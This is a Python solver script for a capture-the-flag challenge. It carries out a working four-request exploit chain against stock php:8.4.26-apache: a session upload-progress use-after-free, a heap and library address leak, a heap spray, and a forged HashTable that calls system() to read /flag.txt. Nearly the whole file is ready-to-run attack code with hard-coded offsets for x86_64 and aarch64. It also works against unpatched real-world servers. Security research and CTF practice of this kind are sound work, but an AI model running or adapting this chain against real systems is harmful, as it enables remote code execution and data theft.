#!/usr/bin/env -S uv run --script
# /// script
# requires-python = ">=3.12"
# dependencies = []
# ///
"""
PHPossessed solver — real-world PHP2Shell, pure HTTP, no target-side files.

CVE-2026-109618 (session.upload_progress UAF + leak) and CVE-2026-109619
(RCE) against the stock php:8.4.26-apache runtime (fix: 8.4.27), running
one static mod_php prefork child. The app is irrelevant — even Hello World
is vulnerable; the bug is in the runtime's request-startup/shutdown dance.

The four-request chain (adapted from the published reference exploit,
9bie/php2shell-bypass-aslr-exp, validated on this exact image + stock
php.ini-production):

  A1  chunked multipart OOM during upload-progress END cleanup, before
      PG(modules_activated)=1 -> PS(id) dangles into residual chunk memory
  B1  the next request initializes the session with the dangling id; a
      forged zend_string header makes Set-Cookie url-encode ~800KB of
      worker heap: ZendMM chunk bases + zval_ptr_dtor -> libphp base
  A2  cheap OOM while parsing nested empty file fields -> PS(http_session_vars)
      dangles
  B2  spray of fake zend_references + one fake HashTable whose pDestructor
      is zif_system; request shutdown destroys the dangling array and
      PHP calls system(<cmd>) for us

The command drops /flag.txt into the session save path as a flash message;
a final GET with that PHPSESSID renders the flag out of the app itself.

usage: solve.py HOST PORT
"""
from __future__ import annotations

import argparse
import re
import socket
import struct
import sys
import time
import urllib.parse
from collections import Counter

BOUNDARY = b"C" * 10
Q = "?q0000000=v&q0000001=v&q0000002=v&q0000003=v&q0000004=v"
LEAK_SPEC = ",".join(["G:511:0x137"] * 14 + ["G:400:0x137", "G:511:0x137", "X:900"])
MAIN_BUCKET_COUNT = 87  # stable fingerprint of the main-chunk bucket
DUP_SLOTS = 4           # duplicate A1 fields that free main-chunk slots (see build_a1)
# B1 target: a script that is standalone and prints nothing.  The leak is
# emitted during request startup, but Apache only flushes it once the request
# finishes, and ps_close_files() has by then freed A1's stale ps_files struct --
# live memory in this request -- so a bin free list is poisoned.  Compiling the
# whole front controller trips over it; registry.php defines functions, emits no
# output and allocates little enough to get the response out.
LEAK_PATH = "/registry.php"
FLAG_RE = re.compile(rb"ccsCTF\{[^}\s]+\}")

# x86_64 offsets into libphp.so for the pinned php:8.4.26-apache image.
PROFILES = {
    "x86_64": {
        "dtor_offset": 0x65EB60,   # zval_ptr_dtor
        "zif_offset": 0x465370,    # zif_system
        "ptr_max": 0x7FFFFFFFFFFF,
        "delta_min": 0x1A00000,
        "delta_max": 0x1F00000,
    },
    "aarch64": {
        "dtor_offset": 0x63812B,
        "zif_offset": 0x42CD70,
        "ptr_max": 0xFFFFFFFFFFFF,
        "delta_min": 0x1F00000,
        "delta_max": 0x2300000,
    },
}

# <= 200 bytes: the fake zend_string carrier only has room for that.
# Writes the flag as a php-serialized flash into a fixed session file, so
# the final GET renders it. POSIX sh only (the container's /bin/sh is dash).
EXFIL_CMD = (
    "F=$(cat /flag.txt|tr -d '\\n');"
    "printf 'flash|s:%d:\"%s\";' \"${#F}\" \"$F\">/tmp/sess_zz"
)
EXFIL_SID = "zz"


# --------------------------------------------------------------------------
# body builders (faithful ports of the reference chain's generators)
# --------------------------------------------------------------------------

def build_a1() -> bytes:
    """A1: END-cleanup send_cookie OOM body (verified OOM shape at 128M)."""
    parts, depth, key_pad = 860, 64, 90
    fillers128, big, big_len = 14, 78, 8000
    burners, burner_len, progress_len = 20, 4000, 4000
    out = bytearray()

    def part(name: bytes, value: bytes = b"", filename: bytes | None = None,
             ctype: bytes | None = None) -> None:
        out.extend(b"--" + BOUNDARY +
                   b"\r\nContent-Disposition: form-data; name=\"" + name + b"\"")
        if filename is not None:
            out.extend(b"; filename=\"" + filename + b"\"")
        out.extend(b"\r\n")
        if ctype is not None:
            out.extend(b"Content-Type: " + ctype + b"\r\n")
        out.extend(b"\r\n" + value + b"\r\n")

    part(b"PHPSESSID", b"\x00")
    # Free MAIN-CHUNK small slots for the session init to reuse.  Sending the
    # same field name twice makes zend_hash_update release the first (early,
    # main-chunk) value, and ZendMM hands small slots out LIFO, so s_open's
    # basedir ("/tmp", bin 32) lands in the main chunk instead of in a chunk
    # that is unmapped when the request bails out.  Without this, B1's
    # ps_close_files -> efree(basedir) hits a chunk whose header is gone and
    # panics with "zend_mm_heap corrupted" before the leak is ever sent.
    for i in range(DUP_SLOTS):
        part(b"d%03d" % i, b"e" * 7)
    for i in range(parts):
        name = ("files[R%05d%s]" % (i, "K" * key_pad)).encode() + b"[a]" * (depth - 2)
        if i == 0:
            out.extend(b"--" + BOUNDARY +
                       b"\r\nContent-Disposition: form-data; name=\"" + name +
                       b"\"; filename=\"A\"\r\nContent-Type: " + b"C" * 103 +
                       b"\r\n\r\n")
        elif i == 1:
            out.extend(b"--" + BOUNDARY +
                       b"\r\nContent-Disposition: form-data; name=\"" + name +
                       b"\"; filename=\"A\"\r\nContent-Type: " + b"C" * 231 +
                       b"\r\n\r\n")
        else:
            out.extend(b"--" + BOUNDARY +
                       b"\r\nContent-Disposition: form-data; name=\"" + name +
                       b"\"; filename=\"\"\r\nContent-Type: "
                       b"application/octet-stream\r\n\r\n")
    for i in range(fillers128):
        part(("f%04d" % i).encode().ljust(103, b"x")[:103], b"v" * 8)
    for i in range(big):
        part(("b%04d" % i).encode(), b"B" * big_len)
    for i in range(burners):
        part(("u%02d" % i).encode(), b"U" * burner_len)
    for i in range(DUP_SLOTS):            # overwrite -> frees the slots above
        part(b"d%03d" % i, b"l" * 7)
    part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k" * progress_len)
    out.extend(b"--" + BOUNDARY + b"--\r\n")
    return bytes(out)


def _forge_fill_value(pages: int, page: int, fake_len: int, idx: int) -> bytes:
    """Full-chunk fill with a fake zend_string header at chunk+page*0x1000;
    the 8 data bytes tag the slot so we can spot it in the leak."""
    length = pages * 4096 - 25
    v = bytearray(b"A" * length)
    hdr = page * 0x1000 - 0x1018
    if 0 <= hdr and hdr + 0x18 + 32 <= length:
        struct.pack_into("<I", v, hdr + 0x00, 0)
        # IS_STRING | IS_STR_INTERNED, not a plain 0x16: php_session_initialize
        # hands PS(id) to the files handler and the rfc1867 END event then runs
        # php_rshutdown_session_globals -> zend_string_release(PS(id)).  Marking
        # the forged header interned makes that release a no-op; otherwise it
        # efree()s an address inside this fill and poisons a small-bin free list.
        struct.pack_into("<I", v, hdr + 0x04, 0x106)
        struct.pack_into("<Q", v, hdr + 0x08, 0)
        struct.pack_into("<Q", v, hdr + 0x10, fake_len)
        # php_session_start() runs strpbrk(ZSTR_VAL(id), "\r\n\t <>'\"\\") and
        # drops PS(id) on a hit, so the forged value has to be a plausible,
        # NUL-terminated session key -- a leading "/" loses the whole leak.
        key = (b"zz%02x%03xzz" % (idx % 256, page)).ljust(31, b"a")[:31]
        v[hdr + 0x18:hdr + 0x18 + 32] = key + b"\x00"
    return bytes(v)


def build_leak_b() -> bytes:
    """B1: basedir-killer floods + id-forge values + nested-field padding."""
    # 0x80000, not the reference's 0xC8000: the id sits at page 0x137 of a
    # 511-page (2MiB) chunk, so a 0xC8000 read ends at 0x1FF018 — 24 bytes
    # past the chunk.  The reference host had the neighbouring 2MiB chunk
    # mapped there; on this kernel it is not, and the overrun SIGSEGVs the
    # worker.  0x80000 still covers the G:400 hole (pages 0x191..0x1B7) where
    # the X-field HashTables with their zval_ptr_dtor pointers land.
    fake_len = 0x80000
    out = bytearray()

    def part(name: bytes, value: bytes) -> None:
        out.extend(b"--" + BOUNDARY +
                   b"\r\nContent-Disposition: form-data; name=\"" + name +
                   b"\"\r\n\r\n" + value + b"\r\n")

    part(b"PHPSESSID", b"a")
    part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k0")
    idx = 0
    for item in LEAK_SPEC.replace(",", " ").split():
        kind, _, arg = item.partition(":")
        if kind == "G":
            pages_s, _, page_s = arg.partition(":")
            v = _forge_fill_value(int(pages_s, 0), int(page_s, 0), fake_len, idx)
        elif kind == "X":
            for _ in range(int(arg, 0)):
                part(("x%05d" % idx).encode() + b"[a]" * 12, b"v")
                idx += 1
            continue
        else:
            raise ValueError("bad spec item %r" % item)
        name = (b"f%04d" % idx).ljust(120, b"f")[:120]
        part(name, v)
        idx += 1
    out.extend(b"--" + BOUNDARY + b"--\r\n")
    return bytes(out)


def build_cheap_oom_a() -> bytes:
    """A2: OOM while the parser builds nested empty file fields — dangles
    PS(http_session_vars). fillers shift the dangling slot within its chunk."""
    parts, depth, fillers = 880, 64, 115
    out = bytearray()

    def part(name: bytes, value: bytes = b"") -> None:
        out.extend(b"--" + BOUNDARY + b"\r\nContent-Disposition: form-data; name=\"" +
                   name + b"\"\r\n\r\n" + value + b"\r\n")

    part(b"PHPSESSID", b"a" * 32)
    part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k0")
    for i in range(fillers):
        part(("%03d" % i).encode(), b"x")
    for i in range(parts):
        name = ("files[R%05d]" % i).encode() + b"[a]" * (depth - 2)
        out.extend(b"--" + BOUNDARY +
                   b"\r\nContent-Disposition: form-data; name=\"" + name +
                   b"\"; filename=\"\"\r\nContent-Type: "
                   b"application/octet-stream\r\n\r\n")
    out.extend(b"--" + BOUNDARY + b"--\r\n")
    return bytes(out)


def build_ht(addr: int, zif: int, cmd: bytes) -> bytes:
    """384-byte carrier: fake HashTable at S (pDestructor = zif_system),
    fake execute_data at S+0x20, fake zend_string + command at S+0x80."""
    if len(cmd) > 0x160 - 0x98:
        raise ValueError("command too long for the 384-byte carrier")
    ht = bytearray(b"\x00" * 384)
    struct.pack_into("<II", ht, 0x00, 1, 7)               # gc: rc=1, IS_ARRAY
    struct.pack_into("<II", ht, 0x08, 0x10, 0xFFFFFFF8)   # flags, nTableMask
    struct.pack_into("<Q", ht, 0x10, addr + 0x20)         # arData
    struct.pack_into("<II", ht, 0x18, 1, 1)               # nNumUsed/nNumOfElements
    struct.pack_into("<II", ht, 0x20, 8, 0)               # nTableSize/pad
    struct.pack_into("<Q", ht, 0x28, 0)                   # nNextFreeElement
    struct.pack_into("<Q", ht, 0x30, zif)                 # pDestructor = zif_system
    e = 0x20
    struct.pack_into("<Q", ht, e + 0x00, 0)               # opline
    struct.pack_into("<Q", ht, e + 0x08, 0)               # call
    struct.pack_into("<Q", ht, e + 0x10, zif)             # return_value
    struct.pack_into("<Q", ht, e + 0x18, 0)               # func
    struct.pack_into("<Q", ht, e + 0x20, 0)               # This.value
    struct.pack_into("<I", ht, e + 0x28, 0)               # This.u1.type_info
    struct.pack_into("<I", ht, e + 0x2C, 1)               # num_args = 1
    struct.pack_into("<Q", ht, e + 0x30, 0)               # prev_execute_data
    struct.pack_into("<Q", ht, e + 0x38, 0)               # symbol_table
    struct.pack_into("<I", ht, e + 0x40, 0)               # call_info
    struct.pack_into("<Q", ht, e + 0x50, addr + 0x80)     # arg1 value
    struct.pack_into("<I", ht, e + 0x58, 6)               # arg1 IS_STRING
    struct.pack_into("<II", ht, 0x80, 1, 0x106)           # zend_string rc=1
    struct.pack_into("<Q", ht, 0x88, 0)
    struct.pack_into("<Q", ht, 0x90, len(cmd))
    ht[0x98:0x98 + len(cmd)] = cmd
    ht[0x98 + len(cmd)] = 0
    return bytes(ht)


def build_fake_ref_b(addr: int, ht: bytes) -> bytes:
    """B2: spray of 384-byte values holding fake zend_references (rc=1,
    ptr=S) plus the ht field carrying the fake HashTable."""
    vl, n1, n2, name_len = 384, 500, 495, 10
    ref = bytearray(32)
    struct.pack_into("<I", ref, 0, 1)        # rc = 1
    ref[4] = 0x0A                            # IS_REFERENCE
    struct.pack_into("<Q", ref, 8, addr)
    struct.pack_into("<I", ref, 16, 0x0107)  # val.type, byte 0x11 != 0
    spray = bytearray(b"S" * vl)
    for off in range(8, vl - 32 + 1, 32):
        spray[off:off + 32] = ref

    def name(prefix: bytes, i: int) -> bytes:
        return ((prefix + ("%09d" % i).encode()) + b"x" * name_len)[:name_len]

    def part(field: bytes, value: bytes) -> bytes:
        return (b"--" + BOUNDARY + b"\r\nContent-Disposition: form-data; name=\"" +
                field + b"\"\r\n\r\n" + value + b"\r\n")

    body = bytearray()
    for i in range(n1):
        body += part(name(b"s", i), bytes(spray))
    body += part(b"ht", ht)
    body += part(b"PHPSESSID", b"a" * 32)
    body += part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k0")
    for i in range(n2):
        body += part(name(b"t", i), bytes(spray))
    body += b"--" + BOUNDARY + b"--\r\n"
    return bytes(body)


# --------------------------------------------------------------------------
# HTTP plumbing
# --------------------------------------------------------------------------

def _recv(sock: socket.socket, cap: int) -> bytes:
    out = bytearray()
    while len(out) < cap:
        chunk = sock.recv(65536)
        if not chunk:
            break
        out.extend(chunk)
    return bytes(out)


def status_of(resp: bytes) -> str:
    """First response line, or a marker when the worker died mid-request."""
    if not resp:
        return "NO-RESPONSE (worker died?)"
    return resp.split(b"\r\n", 1)[0].decode("latin1", "replace")


def send(host: str, port: int, request: bytes, timeout: float,
         cap: int = 8 << 20) -> bytes:
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
    except OSError:
        return b""  # worker respawning after the UAF crash
    sock.settimeout(timeout)
    try:
        sock.sendall(request)
        return _recv(sock, cap)
    except OSError:
        return b""
    finally:
        sock.close()


def send_chunked(host: str, port: int, path: str, body: bytes,
                 timeout: float) -> bytes:
    """Chunked transfer-encoding bypasses post_max_size: with no
    Content-Length the SAPI never runs its content_length=0 discard."""
    head = ("POST %s HTTP/1.1\r\nHost: %s:%d\r\n"
            "Content-Type: multipart/form-data; boundary=%s\r\n"
            "Transfer-Encoding: chunked\r\nConnection: close\r\n\r\n" %
            (path, host, port, BOUNDARY.decode())).encode()
    out = bytearray(head)
    for i in range(0, len(body), 65536):
        piece = body[i:i + 65536]
        out += ("%x\r\n" % len(piece)).encode() + piece + b"\r\n"
    out += b"0\r\n\r\n"
    return send(host, port, bytes(out), timeout)


def send_plain(host: str, port: int, path: str, body: bytes,
               timeout: float) -> bytes:
    head = ("POST %s HTTP/1.1\r\nHost: %s:%d\r\n"
            "Content-Type: multipart/form-data; boundary=%s\r\n"
            "Content-Length: %d\r\nConnection: close\r\n\r\n" %
            (path, host, port, BOUNDARY.decode(), len(body))).encode()
    return send(host, port, head + body, timeout)


# --------------------------------------------------------------------------
# leak parsing
# --------------------------------------------------------------------------

def parse_leak(resp: bytes) -> dict:
    i = resp.find(b"Set-Cookie: PHPSESSID=")
    if i < 0:
        raise RuntimeError("no Set-Cookie in leak response (%d bytes)" % len(resp))
    val = resp[i + len(b"Set-Cookie: PHPSESSID="):].split(b"\r\n")[0]
    dec = urllib.parse.unquote_to_bytes(val.decode("latin1"))
    counts: Counter[int] = Counter()
    for off in range(0, len(dec) - 8, 8):
        q = struct.unpack_from("<Q", dec, off)[0]
        # User-space pointers, whole upper half: native Linux maps heap+libphp
        # at 0x7f.. but WSL2/Docker-Desktop kernels land them at 0x7a..-0x7e..,
        # so a 0x7f floor silently drops every pointer on those hosts.
        if 0x100000000000 <= q <= 0x7FFFFFFFFFFF:
            counts[q] += 1
    if not counts:
        raise RuntimeError("no heap pointers in leak window")
    zdtor, _ = counts.most_common(1)[0]
    arch = "aarch64" if zdtor > 0x7FFFFFFFFFFF else "x86_64"
    profile = PROFILES[arch]
    counts = Counter({q: c for q, c in counts.items() if q <= profile["ptr_max"]})
    lib = zdtor - profile["dtor_offset"]
    buckets: Counter[int] = Counter()
    for q, c in counts.items():
        buckets[q & ~0x1FFFFF] += c
    lib_bucket = zdtor & ~0x1FFFFF
    id_bucket = buckets.most_common(1)[0][0]
    cands = [(b, c) for b, c in buckets.most_common()
             if b not in (lib_bucket, id_bucket)]
    cands.sort(key=lambda bc: (abs(bc[1] - MAIN_BUCKET_COUNT), bc[1]))
    return {
        "arch": arch,
        "profile": profile,
        "lib": lib,
        "main_candidates": [b for b, _ in cands[:3]],
    }


# --------------------------------------------------------------------------
# chain
# --------------------------------------------------------------------------

def preflight(host: str, port: int) -> bool:
    req = ("GET /health.txt HTTP/1.1\r\nHost: %s:%d\r\nConnection: close\r\n\r\n" %
           (host, port)).encode()
    return b"ok" in send(host, port, req, timeout=3, cap=64 << 10)


def read_flag(host: str, port: int) -> bytes | None:
    req = ("GET / HTTP/1.1\r\nHost: %s:%d\r\nCookie: PHPSESSID=%s\r\n"
           "Connection: close\r\n\r\n" % (host, port, EXFIL_SID)).encode()
    for attempt in range(3):  # the child may need a moment to respawn
        body = send(host, port, req, timeout=10, cap=1 << 20)
        match = FLAG_RE.search(body)
        if match:
            return match.group(0)
        if attempt < 2:
            time.sleep(0.5)
    return None


def run_chain(host: str, port: int, deadline: float) -> bytes | None:
    # No warm-up request: ServerLimit=1 means the single prefork child is
    # always there, and a PHP-rendering warm GET would run the app (a real
    # session + a 3KB render) right before A1, shifting the ZendMM free
    # lists so A1's dangling id no longer lands in the chunk B1 forges.
    # The reference's 3-byte echo page made such a warm-up harmless; here
    # it breaks the id-chunk reuse the chain depends on.

    print("[1/4] A1: chunked multipart OOM during upload-progress END cleanup")
    resp = send_chunked(host, port, "/index.php" + Q, build_a1(), timeout=60)
    print("      A1 -> %s (%d bytes)" % (status_of(resp), len(resp)))
    time.sleep(0.2)

    print("[2/4] B1: stale session id OOB read -> heap + libphp leak")
    t0 = time.monotonic()
    resp = send_chunked(host, port, LEAK_PATH, build_leak_b(), timeout=120)
    print("      B1 -> %s (%d bytes, %.1fs)" % (
        status_of(resp), len(resp), time.monotonic() - t0))
    try:
        info = parse_leak(resp)
    except RuntimeError as exc:
        print("      leak failed: %s" % exc)
        return None
    prof = info["profile"]
    print("      arch=%s libphp=%#x candidates=%s" % (
        info["arch"], info["lib"], [hex(b) for b in info["main_candidates"]]))
    cands = [c for c in info["main_candidates"]
             if prof["delta_min"] <= info["lib"] - c <= prof["delta_max"]]
    if not cands:
        print("      no main-chunk candidate with a plausible delta "
              "(saw %s); re-leak" % [hex(info["lib"] - c) for c in info["main_candidates"]])
        return None

    zif = info["lib"] + prof["zif_offset"]
    for cand in cands:
        if time.monotonic() > deadline:
            print("      out of time")
            return None
        s_addr = cand + 0xF8398
        print("[3/4] A2: cheap OOM dangles PS(http_session_vars) "
              "(main=%#x S=%#x)" % (cand, s_addr))
        send_plain(host, port, "/index.php", build_cheap_oom_a(), timeout=60)
        time.sleep(0.2)

        print("[4/4] B2: fake zend_array, pDestructor=zif_system=%#x" % zif)
        ht = build_ht(s_addr, zif, EXFIL_CMD.encode())
        send_plain(host, port, "/index.php", build_fake_ref_b(s_addr, ht),
                   timeout=60)
        time.sleep(0.8)

        flag = read_flag(host, port)
        if flag:
            return flag
        print("      candidate %#x did not fire" % cand)
    return None


def main() -> int:
    parser = argparse.ArgumentParser(description="PHPossessed solver (PHP2Shell)")
    parser.add_argument("host", nargs="?", default="127.0.0.1")
    parser.add_argument("port", nargs="?", default=32003, type=int)
    parser.add_argument("--retries", type=int, default=14)
    args = parser.parse_args()

    if len(EXFIL_CMD) > 200:
        print("[!] exfil command exceeds the 200-byte carrier limit")
        return 2

    print("[*] target=http://%s:%d/ (php:8.4.26-apache, single mod_php child)"
          % (args.host, args.port))
    if not preflight(args.host, args.port):
        print("[!] target not answering /health.txt")
        return 1

    started = time.monotonic()
    deadline = started + 50  # leave headroom to print before the 60s budget
    for attempt in range(1, args.retries + 1):
        # a failed attempt leaves the single prefork child respawning; starting
        # A1 against a dead worker just burns the attempt
        while not preflight(args.host, args.port) and time.monotonic() < deadline:
            time.sleep(0.2)
        print("[*] chain attempt %d/%d" % (attempt, args.retries))
        flag = run_chain(args.host, args.port, deadline)
        if flag:
            print("[+] FLAG: %s (%.1fs)" % (flag.decode(), time.monotonic() - started))
            return 0
        if time.monotonic() > deadline:
            break
    print("[!] no flag after %d attempts" % args.retries)
    return 1


if __name__ == "__main__":
    sys.exit(main())
